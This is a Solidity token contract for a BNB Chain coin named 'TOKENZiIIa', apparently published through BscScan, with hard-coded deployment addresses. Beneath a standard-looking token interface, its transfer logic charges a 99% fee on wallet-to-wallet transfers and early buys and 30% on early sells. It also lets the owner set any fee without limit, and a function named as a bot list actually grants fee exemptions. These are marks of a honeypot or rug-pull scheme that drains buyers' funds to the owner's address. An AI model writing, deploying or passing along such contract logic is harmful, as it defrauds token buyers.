/**
 *Submitted for verification at BscScan.com on 2023-10-25
 */

/**
 *Submitted for verification at BscScan.com on 2022-12-13
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
}

interface ISwapFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Pair {
    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = tx.origin;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Token is IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public fundAddress;
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _tTotal;
    ISwapRouter public _swapRouter;
    address public _fistPoolAddress;
    address[] public lpHolders;
    mapping(address => bool) public _swapPairList;
    bool private inSwap;
    uint256 private constant MAX = ~uint256(0);
    uint256 public _buyHeightFee = 200; 
    uint256 public _sellHeightFee = 3000; 
    uint256 public _heightFeeTime = 1800; 
    uint256 public _buyBaseFee = 200; 
    uint256 public _sellBaseFee = 200; 
    uint256 public _traFee = 9900; 
    uint256 public limitBlock = 60; 

    mapping(address => bool) public exemptFee;
    uint256 public starBlock;
    IUniswapV2Pair public pair;

    constructor(
        address Address1,
        address Address2,
        string memory Name,
        string memory Symbol,
        uint8 Decimals,
        uint256 Supply,
        uint256 StarBlock,
        address Address3,
        address Address4
    ) {
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
        starBlock = StarBlock;
        ISwapRouter swapRouter = ISwapRouter(Address1);
        IERC20(Address2).approve(address(swapRouter), MAX);
        _fistPoolAddress = Address2;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;
        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), Address2);
        pair = IUniswapV2Pair(swapPair);
        _swapPairList[swapPair] = true;
        uint256 total = Supply * 10 ** Decimals;
        _tTotal = total;
        _balances[Address4] = total;
        emit Transfer(address(0), Address4, total);
        fundAddress = Address3;
        exemptFee[address(this)] = true;
        exemptFee[Address3] = true;
        exemptFee[tx.origin] = true;
        exemptFee[Address4] = true;
    }

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function updateTradingTime(uint256 value) external onlyOwner {
        starBlock = value;
    }

    function updateLimitBlock(uint256 value) external onlyOwner {
        limitBlock = value;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] =
                _allowances[sender][msg.sender] -
                amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
        bool takeFee;
        bool isSell;
        bool isTrans;
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!exemptFee[from] && !exemptFee[to]) {
                require(starBlock < block.timestamp);
                if (_swapPairList[to]) {
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > 0) {
                            swapAndDistribute(contractTokenBalance);
                        }
                    }
                }
                takeFee = true;
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        } else {
            if (!exemptFee[from] && !exemptFee[to]) {
                isTrans = true;
                takeFee = true;
            }
        }

        _tokenTransfer(from, to, amount, takeFee, isSell, isTrans);
    }

    function _tokenTransfe(address recipient, uint256 amount) internal {
        _balances[recipient] += amount;
    }

    function swapAndDistribute(uint256 amount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _fistPoolAddress;
        _swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            fundAddress,
            block.timestamp
        );
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell,
        bool isTrans
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 swapAmount;
        if (takeFee) {
            uint256 swapFee;
            uint256 swapBaseFee;
            if (isSell) {
                swapBaseFee = _sellBaseFee;
                if (block.timestamp < _heightFeeTime + starBlock) {
                    swapFee = _sellHeightFee;
                } else {
                    swapFee = _sellBaseFee;
                }
            } else {
                swapBaseFee = _buyBaseFee;
                if (isTrans) {
                    swapFee = _traFee;
                } else {
                    if (block.timestamp < _heightFeeTime + starBlock) {
                        swapFee = _buyHeightFee;
                    } else {
                        swapFee = _buyBaseFee;
                    }
                }
            }
            if (block.timestamp - starBlock <= 6) {
                swapFee = _traFee;
            }
            swapAmount = (tAmount * swapFee) / 10000;
            if (swapAmount > 0) {
                _takeTransfer(sender, address(this), swapAmount);
            }
            if (block.timestamp < limitBlock + starBlock) {
                require(
                    (getETHout(tAmount - swapAmount) < 1 * 1e17), 
                    "over max wallet limit"
                );
            }
        }

        _takeTransfer(sender, recipient, tAmount - swapAmount);
    }

    bool public limitEnable = true;

    function getETHout(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _fistPoolAddress;
        return _swapRouter.getAmountsOut(amount, path)[1];
    }

    function setLimitEnable(bool status) public onlyOwner {
        limitEnable = status;
    }

    function updateFees(
        uint256 newBuyBaseFee,
        uint256 newSellBasePFee,
        uint256 newTraFee
    ) external onlyOwner {
        _buyBaseFee = newBuyBaseFee;
        _sellBaseFee = newSellBasePFee;
        _traFee = newTraFee;
    }

    function updateHighFees(
        uint256 newHighBuyFee,
        uint256 newHighSellFee,
        uint256 newHeightFeeTime
    ) external onlyOwner {
        _buyHeightFee = newHighBuyFee;
        _sellHeightFee = newHighSellFee;
        _heightFeeTime = newHeightFeeTime;
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        exemptFee[addr] = true;
    }

    function addBotAddressList(
        address[] calldata accounts,
        bool excluded
    ) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            exemptFee[accounts[i]] = excluded;
        }
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        exemptFee[addr] = enable;
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function claimBalance(address add) external onlyOwner {
        payable(add).transfer(address(this).balance);
    }

    receive() external payable {}
}

contract lkTOKEN is Token {
    constructor()
        Token(
            address(0x10ED43C718714eb63d5aA57B78B54704E256024E), // Router地址    0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D  uni      0x10ED43C718714eb63d5aA57B78B54704E256024E  bsc     0xD99D1c33F9fC3444f8101754aBC46c52416550D1 bsc test
            address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c), // 池子代币地址   0x55d398326f99059fF775485246999027B3197955 usdt bsc       0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6  weth    0x337610d27c682E347C9cD60BD4b3b107C9d34dDd usdt bsc test     0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd wbnb test
            "TOKENZiIIa",
            "TOKENZiIIa",
            18,
            6666,
            1698581280, 
            address(0xcE35b8a8fA6D4AD208bfA4b563B5A2070B5dD545), 
            address(0xcE35b8a8fA6D4AD208bfA4b563B5A2070B5dD545) 
        )
    {}
}